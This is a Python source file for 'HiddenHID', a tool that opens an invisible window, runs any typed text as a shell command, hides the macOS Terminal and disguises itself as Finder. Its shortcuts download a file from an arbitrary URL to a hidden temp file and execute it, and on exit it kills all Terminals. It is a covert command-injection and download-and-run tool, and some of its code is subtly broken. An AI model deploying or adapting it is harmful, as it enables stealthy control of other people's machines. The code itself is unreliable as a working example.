"""
HiddenHID by BrightShard
Explanation & documentation in the README on my GitHub page:
https://github.com/Bright-Shard/HiddenHID
"""

# For the invisible GUI
from tkinter import Tk, Entry, Menu
# Run commands in a shell
from subprocess import run as shell
# For enabling debug and exiting
from sys import argv
from sys import exit as bye
# Get host OS
from platform import system
# For RegExp, unfortunately
from re import search
# For getting files
import requests
# For hiding files
from tempfile import mkstemp
# For deleting temporary files
from os import remove as rm

# Store any temporary files that were downloaded
files = {}


# curl <url> <fileID>
def curl(*args):
    data = requests.get(args[0])
    file = mkstemp()
    files[args[1]] = file
    with open(file[0], "wb") as openedFile:
        openedFile.write(data.content)


# file <fileID> [run]
def file_handler(*args):
    file = files[args[0]]
    if args[1] == "run":
        shell(file[1])


class App(Tk):
    """
    The invisible app that runs terminal commands
    """
    def __init__(self):
        # Store host OS
        self.os = system()
        # Whether the app should be visible
        self.visible = False
        # If there should be extra output
        self.debug = False
        # If an output file is set
        self.output = None
        # Actually set up Tkinter
        super().__init__()

        # Parse command-line arguments
        for arg in argv:
            # The output argument: "output path/to/log/file" or "output=path/to/log/file"
            # "HiddenHID loaded" will be appended to the file at that location
            if search("^-*o(utput)?=.*$", arg) is not None:
                outFile = arg.split('=', 1)[1]
                self.output = open(outFile, 'a')
                self.log(f"Output file set to '{outFile}'")
            # The visible argument: "vis" or "visible"
            # Makes the normally invisible window visible, as well as the terminal on macOS
            elif search("^-*v(is)?(ible)?$", arg) is not None:
                self.visible = True
            # Debug argument: "debug"
            # Adds additional output in the terminal, like a -v argument
            elif search("^-*d(ebug)?$", arg) is not None:
                self.debug = True
                self.log("Debug mode enabled")

        # macOS stuff (Darwin = macOS)
        if self.os == "Darwin":
            # If the window is supposed to be invisible
            if not self.visible:
                # Hide the terminal
                shell(
                    'osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
                    shell=True, check=False)
                # Make the window invisible
                self.attributes('-alpha', 0)

        # Windows stuff
        elif self.os == "Windows":
            # If the window is supposed to be invisible
            if not self.visible:
                # Make the window invisible
                self.attributes('-alpha', 0)
                # Hide the app icon from the app dock
                self.attributes('-toolwindow', True)

        # Other hosts
        else:
            # Make the window invisible
            self.attributes('-alpha', 0)

        # Shortcut commands, ranging from pranks to exploits
        self.shortcuts = {
            # macOS shortcuts
            'Darwin': {
                # Change the macOS wallpaper: Run as "wallpaper <image url>"
                'wallpaper': 'curl -o "/tmp/wallpaper" "{args[0]}"; osascript -e \'tell application\
                     "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'; rm\
                     /tmp/wallpaper',
                # Set the macOS volume level: Run as "volume <volume level>", with a min of 0 and max of 10
                'volume': 'osascript -e \'set Volume {args[0]}\'',
                # Set the macOS volume to 0
                'mute': 'osascript -e \'set Volume 0\'',
            },
            # Windows shortcuts
            'Windows': {
            },
            # Universal shortcuts (These are in Python, so they run anywhere)
            'Universal': {
                'curl': curl,
                'file': file_handler,
            }
        }

        # Commands are typed into the entry box
        self.entry = Entry(self)
        # Add it to the window
        self.entry.pack()
        # Focus the entry box so the keyboard types into it
        self.entry.focus()
        # Bind the enter key to run the command
        self.entry.bind('<Enter>', self.run_command)
        # It's the return key on some devices, so bind that too
        self.entry.bind('<Return>', self.run_command)

        # On macOS, toolbars still show for invisible apps
        # This clones the toolbar from Finder, so it looks like Finder is open
        # Just make sure the file is named "Finder" so that's what is displayed as the app name
        if self.os == "Darwin":
            # The app toolbar
            menu = Menu(self)
            # Blank menu for each toolbar item
            # Programming in each toolbar action is just too much effort lol
            submenu = Menu(menu, tearoff=0)
            # Each of the toolbar menus in Finder, cloned here
            menu.add_cascade(label="File", menu=submenu)
            menu.add_cascade(label="Edit", menu=submenu)
            menu.add_cascade(label="View", menu=submenu)
            menu.add_cascade(label="Go", menu=submenu)
            menu.add_cascade(label="Window", menu=submenu)
            menu.add_cascade(label="Help", menu=submenu)
            self.config(menu=menu)

        # Log that the app has started
        self.log("HiddenHID loaded successfully\n")

    def run_command(self, *args, **kwargs):
        """
        When 'enter' is pressed, run the command in Subprocess
        The command is taken from the entry widget's text, then the entry widget is cleared
        """
        # Get the text box contents to get the command
        command = self.entry.get()

        # If it's blank, don't even process the command
        if command == '':
            return

        # Exit if the command is 'exit'
        if command == "exit":
            self.quit()

        # Debug
        self.log(f"Running command '{command}'...")

        # Split the command up to get the arguments
        splitCommand = command.split(' ')
        self.log(splitCommand[0])

        # If the command is a shortcut, run the shortcut
        if splitCommand[0] in self.shortcuts[self.os] or splitCommand[0] in self.shortcuts["Universal"]:
            # Print that a shortcut was detected
            self.log("-> Shortcut detected! Running a shortcut instead.")
            # The shortcut
            shortcut = self.shortcuts[self.os][splitCommand[0]]
            # If the shortcut is a string, run it as a shell script
            if type(shortcut) == str:
                shell(shortcut.format(args=splitCommand[1:]), shell=True, check=False)
            # If the shortcut is a function, run the python code
            else:
                shortcut(splitCommand[1:])
        else:
            # Otherwise, run the command
            shell(command, shell=True, check=False)

        # Clear the command input
        self.entry.delete(0, len(self.entry.get()))
        # Print a new line for a separator between command outputs
        print('')

    def log(self, message: str):
        if self.debug:
            print(message)
            if self.output is not None:
                self.output.write(message+'\n')

    def quit(self):
        """
        Quit the app and close any open terminals
        """
        self.log("Exiting...")
        # Delete temporary files
        for file in files.items():
            rm(file[1])
        # macOS stuff
        if self.os == 'Darwin':
            # Kill all terminals
            shell('killall Terminal', shell=True)
        # Exit
        bye(0)


App().mainloop()
